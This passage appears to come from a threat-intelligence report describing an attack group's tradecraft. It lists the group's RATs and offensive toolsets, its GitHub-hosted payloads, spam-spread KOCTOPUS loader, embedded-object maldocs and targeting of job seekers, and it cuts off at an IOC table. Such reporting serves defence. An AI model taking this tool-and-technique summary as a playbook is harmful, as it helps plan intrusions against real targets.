open-source offensive security toolsets for different stages of its attack kill-chain including\nPowerShell Empire, Koadic RAT, Octopus RAT, Nishang and Invoke-Ngrok\n\n\n\n- Hosts payloads and scripts mostly on GitHub\n\n\n\n- Uses scripting languages in its attacks: batch, VBScript, PowerShell and JavaScript\n\n\n\n- Uses spam campaigns to spread its KOCTOPUS loader\n\n\n\n- Mainly targets IATA and people looking for jobs (in particular those who want to immigrate to Canada\nthrough the skill workers program)\n\n\n\n- Usually uses two multi-stage backdoors in its attacks\n\n\n\n- Uses commercially available RATs in its attacks including Quasar, LuminosityLink, Remcos, njRAT, Adwind\nand RMS\n\n\n\n- Uses a Batch encryption tool to encrypt all of its batch loaders\n\n\n\n- Uses embedded objects within the maldocs instead of using macros\n\n\n-----\n\n## Indicators of Compromise (IOCs)\n\n|Indicators of Compromise
